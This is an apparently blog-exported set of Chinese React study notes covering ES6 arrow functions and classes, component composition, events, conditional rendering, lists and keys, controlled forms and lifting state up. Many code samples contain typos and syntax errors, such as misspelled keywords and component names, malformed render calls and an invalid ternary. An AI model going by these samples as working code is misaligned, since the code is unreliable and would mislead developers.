&lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ); &#125;)&#125; &lt;/div&gt; ); &#125;&#125;export default App; ES6 箭头函数箭头函数表达式比普通的函数表达式更加简洁 1234//函数表示式function()&#123;...&#125;//箭头函数（） =&gt; &#123;...&#125; 注意：如果函数只有一个参数，就可以移除参数的括号，但是如果有多个参数，就必须保留这个括号 123456//允许item =&gt;&#123;...&#125;(item) =&gt;&#123;...&#125;(item,key) =&gt;&#123;...&#125;//不允许item,key =&gt;&#123;...&#125; 上例可以改写为 1234567891011121314151617181920class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(item =&gt;&#123; return( &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ); &#125;)&#125; &lt;/div&gt; ); &#125;&#125; 另外在ES6的箭头函数中，可以简洁函数体来替换块状函数体（用花括号{}表示），简洁函数体的返回不用显示声明，这样就可以移除掉return表示式，那再改简洁 123456789101112131415161718class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ); &#125;&#125; ES6类javaScript ES6中引入了类的概念。类通常在面向对象编程语言中被使用，可以根据使用情况一边使用函数式编程一边使用面向对象编程尽管React为了例如不可变数据结构等的特征而拥抱函数式编程，但是它还是使用类来声明组件，这些组件就被称为ES6组件，React混合使用了两种编程范式中的有益部分 例如下面这个Developer类 12345678910class Developer&#123; constructor(firstname,lastname)&#123; this.firstname = firstname; this.lastname = lastname; &#125; getName()&#123; return this.firstname + &apos;&apos; +this.lastname; &#125;&#125; 类都有一个用来实例化自己的构造函数，这个构造函数可以用来传入参数来赋予给类的实例。此外，类可定义函数，因为这个函数被关联给了类，所有它被称为方法，通常它被当称为类的方法。实例化上面的Develper类，以及使用它的方法 const Lbh = new Developer(‘Lai’,’binhong’);console.log(Lbh.getName()); React 使用JavaScript ES6类来实现 ES6组件 123456import React, &#123;Component&#125; from &apos;react&apos;; class App extends Component &#123; render()&#123; ... &#125;&#125; App类继承自Component，你可以声明App组件，但是这个组件需要继承自另一个组件，继承的意思就是在一个面向对象编程的语言中，你要需要遵循继承原则， 它可以把功能从一个类传递到另一个类 这个App类就从Component类中继承了它的功能，这个Component类是从一个基本ES6类中继承来的ES6组件类。它 有一个React组件所需要的所有功能。渲染（render）方法就是其中可以使用的一个功能。这个Component 类封装了所有React类需要的细节。React Component类暴露出来的方法都是公共的接口，这些方法有一个方法必须被重写，其他的则不一定要被重写。render()方法是必须要被重写的方法，因为你定义了一个React组件的输出，它必须被定义 参考链接：https://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day3]]></title>
    <url>%2F2018-06-05-react-third-day.html</url>
    <content type="text"><![CDATA[react 学习笔记day-03 组成与继承Composition vs Inheritance React具有巨大的组合模型，推荐使用组件组合而不是用继承 Containment 很多组件一开始并不知道它们的子组件是什么，例如侧边栏，对话框等 建议这样的组件用特殊的子类(children)将参数直接传到它们的输出 1234567function FancyBorder(props)&#123; return( &lt;div className = &#123;&apos;FancyBoder FancyBorder-&apos; +props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; )&#125; 让组件通过嵌套JSX直接传值给子类123456789101112function WelcomeDialog()&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;h1 className = &quot;Dialog-title&quot;&gt; Hi! &lt;/h1&gt; &lt;p className = &quot;Dialog-message&quot;&gt; 你好~ &lt;/p&gt; &lt;/FancyBorder&gt; )&#125; 有时候你需要很多个地方插口在组件中，而不是只使用children1234567891011121314151617181920212223242526272829function Contacts()&#123; return &lt;div className = &quot;Contacts&quot;/&gt;; &#125; function Chat()&#123; return &lt;div className = &quot;Chat&quot;/&gt;; &#125; function SplitPane(props)&#123; return()&#123; &lt;div className = &quot;SplitPane&quot;&gt; &lt;div className = &quot;SplitPane-left&quot;&gt; &#123;props.left&#125; &lt;/div&gt; &lt;div className = &quot;SpiltPane-right&quot;&gt; &#123;props.right&#125; &lt;/div&gt; &lt;/div&gt; &#125;&#125; function App()&#123; return( &lt;SplitPane left = &#123;&lt;Contacts/&gt;&#125; right = &#123;&lt;Chat/&gt;&#125;&gt; );&#125; ReactDOM.render()&#123; &lt;App/&gt;, document.getElementById()&#125; 在React中，像&lt;Contanct/&gt;或者&lt;Chat/&gt;等元素可以看成一个对象，可以像传参数一样将这些数据传递。 特殊情况 有时候在众多子组件中，可能会有一个特殊的组件。下例中，WelcomeDialog就是Dialog中特殊的一个 123456789101112131415161718192021222324252627282930313233funtion FancyBorder(props)&#123; return( &lt;div className=&#123;&apos;FancyBorder FancyBorder-&apos; + props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; );&#125;function Dialog(props)&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;h1 className = &quot;Dialog-title&quot;&gt; &#123;props.title&#125; &lt;/h1&gt; &lt;p className = &quot;Dialog-message&quot;&gt; &#123;props.message&#125; &lt;/p&gt; &lt;/FancyBorder&gt; )&#125; function WelcomeDialog()&#123; return( &lt;Dialog title = &quot;Hi~&quot; message = &quot;你好&quot; /&gt; );&#125; ReactDOM.render()&#123; &lt;WelcomeDialog/&gt;, document.getElementById(&apos;root&apos;)&#125; 组件对定于为类的同样适用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function FancyBorder(props) &#123; return ( &lt;div className=&#123;&apos;FancyBorder FancyBorder-&apos; + props.color&#125;&gt; &#123;props.children&#125; &lt;/div&gt; )&#125;function Dialog(props)&#123; return( &lt;FancyBorder color = &quot;blue&quot;&gt; &lt;div className = &quot;Dialog-title&quot;&gt; &lt;h1&gt;&#123;props.title&#125;&lt;/h1&gt; &lt;/div&gt; &lt;div className = &quot;Dialog-message&quot;&gt; &lt;p&gt;&#123;props.message&#125;&lt;/p&gt; &lt;/div&gt; &lt;div&gt; &#123;props.children&#125; &lt;/div&gt; &lt;/FancyBorder&gt; )&#125;class SignUpDialog extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;signUpName:&apos;&apos;&#125;; this.handleChange = this.handleChange.bind(this); this.handleShow = this.handleShow.bind(this);&#125;handleChange(e)&#123; this.setState(&#123;signUpName:e.target.value&#125;);&#125;handleShow(e)&#123; alert(&apos;你好 &apos; + this.state.signUpName); e.preventDefault();&#125;render()&#123; return( &lt;Dialog title = &quot;你好&quot; message = &quot;欢迎来到这里&quot; &gt; &lt;input type = &quot;text&quot; value=&#123;this.state.signUpName&#125; onChange = &#123;this.handleChange&#125;/&gt; &lt;button value = &quot;Sign Me Up!&quot; type = &quot;Submit&quot; onClick = &#123;this.handleShow&#125;&gt;Sign Me Up!&lt;/button&gt; &lt;/Dialog&gt; ); &#125;&#125;ReactDOM.render( &lt;SignUpDialog/&gt;, document.getElementById(&apos;root&apos;)) 至于继承就没有了，组件可以接受任意的props，包括原始值、反应元素或函数如果希望在组件之间重用非ui功能，可以将其提取到单独的js模块中，组件可以导入并且使用该函数、对象、或者类，而不是进行扩展 对应构建React项目的思考React是使用js构建大型，快速web应用程序的主要方式。一般构建一个react应用程序的思考过程如下： 第一步：将ui分解为组件层次结构结合设计稿来分层次命名 第二步：在React中构建静态版本根据层次结构来构建静态版本的页面，不要有交互。需要构建可重用组件并使用props传递数据的组件。不要使用state来构建静态组件。state用于交互性，即随时间变化的数据构建分为自上而下跟自下而上。大型项目是自下而上，小型则反之。 第三步：确定ui状态的最小但是完整表示形式 确定是否为state可以自问三个问题1.通过props从父母传入2.随着时间推移而保持不变3.基于组件中的任何state或者props来计算其中任何一个答案是肯定的则不是state 第四步：确定state在哪里应该存在对于应用程序中的每一个state1.确定每个基于该state呈现某些内容的组件2.找到一个共同的拥有者组件3.无论是公共所有者，还是等级较高的其他组成部分都应该拥有该state4.如果无法找到一个有意识拥有这个state的组件，可以创建一个新的组件，只是为了保存state并将它添加到公共所有 者组件上方的层次结构中的某处 第五步：添加反向数据流参考链接：https://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react-day2]]></title>
    <url>%2F2018-06-04-react-second-day.html</url>
    <content type="text"><![CDATA[react 学习笔记day-02处理事件使用React元素处理事件与处理DOM元素上的事件非常相似，有一些语法差异React事件使用camelCase命名，而不是小写使用JSX，将传递函数作为事件处理函数，而不是字符串 HTML： &lt;button onclick = &quot;activateLasers()&quot;&gt;Activate Lasers&lt;/button&gt; React: &lt;button onClick={activateLasers}&gt;Activate Lasers&lt;/button&gt; 另外一个区别是，无法返回false以防React的默认行为，必须使用preventDefault明确调用。 HTML: &lt;a href=&quot;#&quot; onclick=&quot;conslog.log(&#39;The link was clicked&#39;); return false&quot;&gt;Click me&lt;/a&gt; React： 1234567891011function ActionLink()&#123; function handleClick(e)&#123; e.preventDefault(); console.log(&apos;The link was clicked.&apos;); &#125; return( &lt;a href=&quot;#&quot; onClick=&#123;handleClick&#125;&gt; Click me &lt;/a&gt; );&#125; 使用React，通常不需要调用addEventListener添加侦听器到DOM元素后创建，相反，只需在元素初始呈现时提供侦听器Toggle组件 12345678910111213141516171819202122232425class Toggle extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;isTogglenOn:true&#125;; this.handleClick = this.handleClick.bind(this); &#125; handleClick()&#123; this.setState(prevState =&gt; (&#123; isToggleOn: !prevState.isToggleOn &#125;)); &#125; render()&#123; return( &lt;button onClick=&#123;this.handleClick&#125;&gt; &#123;this.state.isToggleOn?&apos;ON&apos;?&apos;OFF&apos;&#125; &lt;/button&gt; ); &#125;&#125;React.render( &lt;Toggle/&gt;, document.getElementById(&apos;root&apos;);); 如果引用一个没有（）后面的方法，比如onClick={this.handleClick}你应该绑定那个方法 123456789101112class LoggingButton extends React.component&#123; handleClick = () =&gt;&#123; console.log(&apos;this is &apos;,this); &#125; render()&#123; return( &lt;button onclick=&#123;this.handleClick&#125;&gt; Click me &lt;/button&gt; ) &#125;&#125; 将参数传递给事件处理程序在循环内部，通常需要将一个额外的参数传递给事件处理程序。下例，id是行ID &lt;button onClick={(e) =&gt; this.deleteRow(id,e)}&gt;Delete Row&lt;/button&gt;&lt;button onClcik={this.deleteRow.bind(this,id)}&gt;Delete Row&lt;/button&gt; e代表React事件的参数都将作为ID之后的第二个参数传递，使用箭头函数，我们必须明确传递它，但是bind任何更多的参数都会自动转发 有条件的渲染React中，可以创建封装所需行为的独特组件，可以仅渲染其中的一部分，具体取决于应用程序的状态React中的条件呈现与条件跟js的工作方式相同，使用js的if运算符，或者是条件运算符创建表示当前状态的元素，并让React更新UI来匹配它们 123456789101112131415161718function UserGreeting(props)&#123; return &lt;h1&gt;Welcome back!&lt;/h1&gt;;&#125;function GuestGreeting(props)&#123; return &lt;h1&gt;Please sign up.&lt;/h1&gt;&#125;function Greeting(props)&#123; const isLoggedIn = props.isLoggedIn; if(isLoggedIn)&#123; return &lt;UserGreeting/&gt;; &#125; return &lt;GuserGreeting/&gt;;&#125;React.render( &lt;GuestGreeting isLoggedIn=&#123;false&#125;/&gt;, documenet.getElementById(&apos;root&apos;);); 元素变量可以使用变量来存储元素，有条件地渲染组件的一部分，而其余输出不会更改 代表注销和登录按钮的新组件 1234567891011121314function LoginButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Login &lt;/button&gt; );&#125;function LogoutButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Logout &lt;/button&gt; );&#125; 创建有状态的组件LoginControl,呈现&lt;LoginButton/&gt;或&lt;LogoutButton/&gt;根据其当前状态，它也会呈现一个&lt;Greeting/&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class LoginControl extends React.Component&#123; constructor(props)&#123; super(props); this.handleLoginClick = this.handleLoginClick.bind(this); this.handleLogoutClick = this.handleLogoutClick.bind(this); this.state = &#123;isLoggedIn : false&#125;; &#125; handleLoginClick()&#123; this.setState(&#123;isLoggedIn:true&#125;); &#125; handleLogoutClick(&#123; this.setState(&#123;isLoggedIn:false&#125;); &#125;); render()&#123; const isLoggedIn = this.state.isLoggedIn; let button = null; if (isLoggedIn) &#123; button = &lt;LogoutButton onClick=&#123;this.handleLogoutClick&#125; /&gt;; &#125; else &#123; button = &lt;LoginButton onClick=&#123;this.handleLoginClick&#125; /&gt;; &#125; return( &lt;div&gt; &lt;Greeting isLoggedIn = &#123;isLoggedIn&#125; /&gt; &#123;button&#125; &lt;/div&gt; ); &#125;&#125;function UserGreeting(props)&#123; return &lt;h1&gt;Welcome back!&lt;/h1&gt;&#125;function GuestGreeting(props)&#123; return &lt;h1&gt;Please sign up.&lt;/h1&gt;&#125;function Greeting(props)&#123; const isLoggedIn = props.isLoggedIn; if(isLoggedIn)&#123; return &lt;UserGreeting /&gt;; &#125; return &lt;GusetGreeting /&gt;;&#125;function LoginButton(props)&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Login &lt;/button&gt; );&#125;function LogoutButton()&#123; return( &lt;button onClick = &#123;props.onClick&#125;&gt; Logout &lt;/button&gt; )&#125;ReactDOM.render( &lt;LoginControl /&gt;, document.getElementById(&apos;root&apos;);); 内联使用逻辑&amp;&amp;运算符包裹在花括号中嵌入JSX的任何表达式中 1234567891011121314151617function Mailbox(props)&#123; const unreadMessage = props.unreadMessage; return( &lt;div&gt; &lt;h1&gt;Hello&lt;/h1&gt; &#123;unreadMessage.length &gt; 0 &amp;&amp; &lt;h2&gt; You have &#123;unreadMessage.length &#125; unread message&lt;/h2&gt; &#125; &lt;/div&gt; );&#125;const message = [&apos;React&apos;,&apos;Re:React&apos;,&apos;Re:Re:React&apos;]; ReactDOM.render( &lt;Mail unreadMessage = &#123;message&#125; /&gt;, document.getElementById(&apos;root&apos;);); 与条件元素内联使用if-elseeg1: 12345678render()&#123; const isloggedIn = this.state.isLoggedIn; return( &lt;div&gt; The user is &lt;b&gt; &#123;isLoggIn ? &apos;currently&apos; : &apos;not&apos;&#125;&lt;/b&gt; logged in &lt;/div&gt; );&#125; eg2: 1234567891011121314render()&#123; const isLoggedIn = this.state.isLoggedIn; return( &lt;div&gt; &#123; isLoggedIn ? ( &lt;LogoutButton onClick = &#123;this.handleLogoutClick /&#125;&gt; ):( &lt;LoginButton onClick = &#123;this.handleLoginClick&#125; /&gt; ) &#125; &lt;/div&gt; );&#125; 防止组件呈现组件可以隐藏自身，null 12345678910111213141516171819202122232425262728293031323334353637383940function WarningBanner(props)&#123; if(!props.warn)&#123; return null; &#125; return( &lt;div className=&quot;warning&quot;&gt; Warning! &lt;/div&gt; );&#125;class Page extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;showWarning: true&#125;; this.handleToggleClick = this.handleToggleClick.bind(this); &#125;&#125;handleToggleClick()&#123; this.setState(prevState =&gt;(&#123; showWarning : !prevState.showWarning &#125;));&#125;render()&#123; return( &lt;div&gt; &lt;WarningBanner warn = &#123;this.state.showWarning&#125; /&gt; &lt;button onClick = &#123;this.handleToggleClick&#125;&gt; &#123;this.state.showWarning ? &apos;Hide&apos;: &apos;Show&apos;&#125; &lt;/button&gt; &lt;/div&gt; );&#125;ReactDOM.render( &lt;Page/&gt;, document.getElementById(&apos;root&apos;)); null从组件的render方法返回不会影响声明周期方法的触发 列表和键js中转换列表，map函数来获取numbers并将其值加倍 123const numbers = [1,2,3,4,5];const doubled = numbers.map((number) =&gt; number*2);console.log(doubled); 而在React中，将数组转换为元素列表几乎完全一样 渲染多个组件可以构建元素集合，并使用大括号将其包含在JSX中 {}numbers使用js map函数遍历数组，li为每个项目返回一个元素，最后将得到的元素数组分配给listItems 12const numbers = [1,2,3,4,5];const listItems = number.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt;); 再将整个listItems数组包含在一个ul元素中，并将其呈现给DOM 1234ReactDOM.render( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt;, document.getElementById(&apos;root&apos;)); 基本列表组件 组件中渲染列表可以将前面的例子重构为一个组件，该组件接受一个数组numbers并输出一个无序的元素列表 12345678910111213function NumberList(props)&#123; const number = props.number; const listItems = number.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt;); return( &lt;ul&gt; &#123;listItems&#125; &lt;/ul&gt; );&#125;const number = []1,2,3,4,5];ReactDOM.render( &lt;NumberList numbers = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); 运行这段代码时，会给你一个警告，即应该为列表项提供一个密钥。“键”是在创建元素列表时需要包含的特殊字符串属性 12345678910111213141516function NumberList(props)&#123; const numbers = props.numbers; const listItems = number.map((number) =&gt; &lt;li key=&#123;number.toString()&#125;&gt; &#123;number&#125; &lt;/li&gt; ); return( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1,2,3,4,5];ReactDOM.render( &lt;NumberList number = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); 键可以帮助React识别哪些项目已经更改，添加，删除。键应该赋予数组内稳定的元素 123456const numbers - [1,2,3,4,5];const listItems = number.map((number) =&gt; &lt;li key = &#123;number.toString()&#125;&gt; &#123;number&#125;&lt;/li&gt;); 选择id作为标志关键字比较多12345const todoItems = todo.map((todo) =&gt; &lt;li key = &#123;todo.id&#125;&gt; &#123;todo.text&#125;&lt;/li&gt;); 如果没有稳定id，可以使用索引 12345const todoItems = todos.map((todo,index) =&gt;&lt;li key = &#123;index&#125;&gt; &#123;todo.text&#125;&lt;/li&gt;); 如果项目的顺序会改变的话，则不建议使用索引，这可能会对性能造成负面影响，并可能带来组件状态问题。 用键提取组件提取listItem组件，保留数组中的元素而不是本身li元素 1234567891011121314151617function ListItem(props)&#123; return &lt;li&gt;&#123;props.value&#125;&lt;/li&gt;&#125;function NumberList(props)&#123; const numbers = props.number; const listItems = numbers.map((number) =&gt; &lt;ListItem key = &#123;number.toString()&#125; value = &#123;number&#125; /&gt; ); return( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1,2,3,4,5];ReactDOM.render( &lt;NumberList numbers = &#123;numbers&#125; /&gt;, document.getElementById(&apos;root&apos;)); key在兄弟姐妹中必须是唯一的在我们生成两个不同数组的时候，我们可以用相同的键 12345678910111213141516171819202122232425262728function Blog(props)&#123; const sidebar = ( &lt;ul&gt; &#123;props.posts.map(post) =&gt;&#123; &lt;li key = &#123;post.id&#125;&gt;&#123;post.title&#125;&lt;/li&gt; &#125;&#125; &lt;/ul&gt; ); const content = props.posts.map((post) =&gt; &lt;div key = &#123;post.id&#125;&gt; &lt;h3&gt;&#123;post.title&#125;&lt;/h3&gt; &lt;p&gt;&#123;post.content&#125;&lt;/p&gt; &lt;/div&gt; ); return ( &lt;div&gt; &#123;sidebar&#125; &lt;hr/&gt; &#123;content&#125; &lt;/div&gt; );&#125;const posts = [&#123;id;1,title:&apos;title1&apos;,content:&apos;content1&apos;&#125;,&#123;id;2,title:&apos;title2&apos;,content:&apos;content2&apos;&#125;];ReactDOM.render( &lt;Blog posts = &#123;posts&#125;&gt;, document.getElementById(&apos;root&apos;)); 在JSX嵌入map()12345678910function NumberList(props)&#123; const numbers = props.number; return( &lt;ul&gt; &#123;number.map(number) =&gt; &lt;ListItem key = &#123;number.toString()&#125; value = &#123;number&#125; /&gt; &#125; &lt;/ul&gt; );&#125; 这样嵌套使用有可能提高了可读性，但是如果map嵌套起来太复杂的话就可以考虑提取组件出来 形式forms受控组件表单元素（Input/textarea/select）通常保持自己的状态并根据用户输入更新，在React中，可变状态通常保存在组件的状态属性中，并且更新只能使用setState()可以通过使React状态成为单一真相源来结合着两者，然后呈现表单的React组件也控制后续用户输入中以该表单发生的事情。输入表单元素的值由React以这种方式控制，叫做‘受控组件’ 12345678910111213141516171819202122232425262728293031323334class NameForm extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;value:&apos;&apos;&#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125;&#125;handleChange(event)&#123; this.setState(&#123;value:event.targer.value&#125;);&#125;handleSubmit(event)&#123; alert(&apos;提交的值为： &apos; +this.state.value); event.preventDefault();&#125;render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;input type=&quot;text&quot; value = &#123;this.state.value&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt; );&#125;ReactDOM.render()&#123; &lt;NameForm /&gt;, document.getElementById(&apos;root&apos;)&#125; 由于value属性设置在表单元素上，因此显示的值将始终为this.state.value,使React状态成为真值的来源，由于handleChange每次击键时都会运行以更新React状态，因此显示的值将随用户键入而更新 对于受控组件，每个状态变异都会有一个关联的处理函数，这使修改或验证用户输入变得非常简单，例如我们想强制全部大写来编写名称 123handleChange(event)&#123; this.setState(&#123;value:event.target.value.toUpperCase()&#125;);&#125; textarea标签HTML中： &lt;textarea&gt;textarea&lt;/textarea&gt; React中，value属性代表textarea的值 12345678910111213141516171819202122232425262728293031323334353637class EssayForm extends React.Component&#123; construct(props)&#123; super(props); this.state = &#123; value:&apos;textarea 123321&apos; &#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange()&#123; this.setState(&#123;value:event.target.value&#125;); &#125; handleSubmit()&#123; alert(&apos;new textarea content is&apos; +this.state); event.preventDefault(); &#125; render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;label&gt; textarea: &lt;textarea value = &#123;this.state.value&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; ); &#125;&#125;;ReactDOM.render( &lt; EssayForm/&gt;, document.getElementById(&apos;root&apos;)); 选择标签HTML中： 123456&lt;select&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot; selected&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;&lt;/select&gt; React中： 12345678910111213141516171819202122232425262728293031323334353637class FlavorForm extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123;value:&apos;2&apos;&#125; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange(event)&#123; this.setState(&#123;value:event.target.value&#125;); &#125; this.handleSubmit(event)&#123; alert(&apos;选中’+this.target.value); event.preventDefault(); &#125; render()&#123; return( &lt;form onSubmit = &#123;this.handleSubmit&#125;&gt; &lt;select onChange = &#123;this.handleChange&#125; value=&#123;this.state.value&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;form/&gt; ); &#125;&#125;ReactDOM.render( &lt;FlavorFrom /&gt;, document.getElementById(&apos;root&apos;)); 总的来说，&lt;input type=&quot;text&quot;&gt;,&lt;textarea&gt;和&lt;select&gt;所有的工作过程都比较相似，都可以接受value，可以通过它实现控制组件的属性 注意： 可以将数组传递给value属性，从而在select标签中选择多个选项 &lt;select multiple = {true} value={[‘B’,’C’]}&gt; 文件输入标签 它的值是只读的，所以它是React中不受控制的组件 HTML： &lt;input type = &quot;file&gt;&quot; 处理多个输入当需要处理多个受控input元素时，可以name为每个元素添加一个属性，并让成处理函数根据值来选择要执行的操作event.target.name 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Reservation extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123; isGoing:true, numberOfGuset:2 &#125;; this.handleInputChange = this.handleInputChange.bind(this); &#125; handleInputChange(event)&#123; const target = event.target; const value = target.type === &apos;checkbox&apos; ? target.checked : target.value; const name = target.name; this.setState(&#123; [name]:value &#125;); &#125; render()&#123; return&#123; &lt;form&gt; &lt;label&gt; Is going: &lt;input name = &quot;isGoing&quot; type = &quot;checkbox&quot; checked = &#123;this.state.isGoing&#125; onChange = &#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;br/&gt; &lt;label&gt; Number of guests &lt;input name = &quot;numberOfGuests&quot; type = &quot;number&quot; value = &#123;this.state.numberOfGuset&#125; onChange = &#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;/form&gt; &#125; &#125;&#125; ReactDOM.render( &lt;Reservation/&gt;, document.getElementById(&apos;root&apos;)); 其中 123this.setState(&#123; [name]:value&#125;); 相当于下面的这个es5代码: 123var pratialState = &#123;&#125;;pratialState[name] = value;this.setState(pratialState); 受控组件的替代品使用受控组件有时会非常乏味，因为您需要为数据可以改变的每种方式编写一个事件处理程序，并通过React组件管理所有输入状态。当您将预先存在的代码库转换为React或将React应用程序与非React库集成时，这会变得特别烦人。在这些情况下，您可能需要检查不受控制的组件，这是实现输入表单的另一种技术。 九、提升状态Lifting State Up通常几个组件需要放映相同的变化数据，建议将共享状态提升至最接受的共同祖先温度计算器，用于计算在给定温度下水是否沸腾 1234567891011121314151617181920212223242526272829303132333435363738funtion BoilingVerdict(props)&#123; if(props.celsius &gt;=100)&#123; return &lt;p&gt;The water would boil&lt;/p&gt; &#125; return &lt;p&gt; The water would not bold.&lt;/p&gt;&#125;class Calulator extends React.Component&#123; constructor(props)&#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123;temperature:&apos;&apos;&#125;; &#125; handleChange(e)&#123; this.setState(&#123;temperature:e.target.value&#125;); &#125; render()&#123; const temperature = this.state.temperature; return( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in Celsius:&lt;/legend&gt; &lt;input value = &#123;temperature&#125; onChange = &#123;this.handleChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(temperature)&#125;/&gt; &lt;/fieldset&gt; ) &#125;&#125;ReactDOM.render( &lt;Calulator/&gt;, document.getElementById(&apos;root&apos;)); 华氏 摄氏同时转换判断是否水沸腾(props/state的区别使用)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899const scaleNames = &#123; c:&apos;Celsius&apos;, f:&apos;Fahrenheit&apos;&#125;;function toCelsius(fahrenheit)&#123; return (fahrenheit-32)*5/9;&#125;function toFahrenheit(celsius)&#123; return (celsius*9/5)+32;&#125;function tryConvert(temperature,convert)&#123; const input = parseFloat(temperature); if(Number.isNaN(input))&#123; return &apos;&apos;; &#125; const output = convert(input); const rounded = Math.round(output * 1000)/1000; return rounded.toString();&#125;funtion BoilingVerdict(props)&#123; if(props.celsius &gt;=100)&#123; return &lt;p&gt;The water would boil&lt;/p&gt; &#125; return &lt;p&gt; The water would not bold.&lt;/p&gt;&#125;class TemperatureInput extends React.Component&#123; constructor(props)&#123; super(props); this.handleChange = this.handleChange.bind(this); &#125;; handleChange(e)&#123; this.props.onTemperatureChange(e.target.value); &#125; render()&#123; const temperature = this.props.temperature; const scale = this.props.scale; return( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in &#123;scaleNames[scale]&#125;:&lt;/legend&gt; &lt;input value=&#123;temperature&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/fieldset&gt; ); &#125;&#125;class Calculator extends React.Component&#123; constructor(props)&#123; super(props); this.handleCelsiusChange = this.handleCelsiusChange.bind(this); this.handleFahrenheitChange = this.handleFahrenheitChange.bind(this); this.state = &#123;temperature: &apos;&apos;, scale: &apos;c&apos;&#125;; &#125; handleCelsiusChange(temperature)&#123; this.setState(&#123;scale:&apos;c&apos;,temprature&#125;); &#125; handleFahrenheitChange(temperature)&#123; this.setState(&#123;scale:&apos;f&apos;,temprature&#125;); &#125; render()&#123; const scale = this.state.scale; const temperature = this.state.temperature; const celsius = scale === &apos;f&apos; ? tryConvert(temperature,toCelsius) : temperature; const fahrenheit = scale === &apos;c&apos; ? tryConvert(temperature,toFahrenheit) : temperature; return( &lt;div&gt; &lt;TemperatureInput scale = &quot;c&quot; temperature = &#123;celsius&#125; onTemperatureChange = &#123;this.handleCelsiusChange&#125; /&gt; &lt;TemperatureInput scale = &quot;f&quot; temperature = &#123;fahrenheit&#125; onTemperatureChange = &#123;this.handleFahrenheitChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(celsius)&#125; /&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;Calculator /&gt;, document.getElmentById(&apos;root&apos;)); 参考链接：https://react.docschina.org/docs/hello-world.html]]></content>
      <categories>
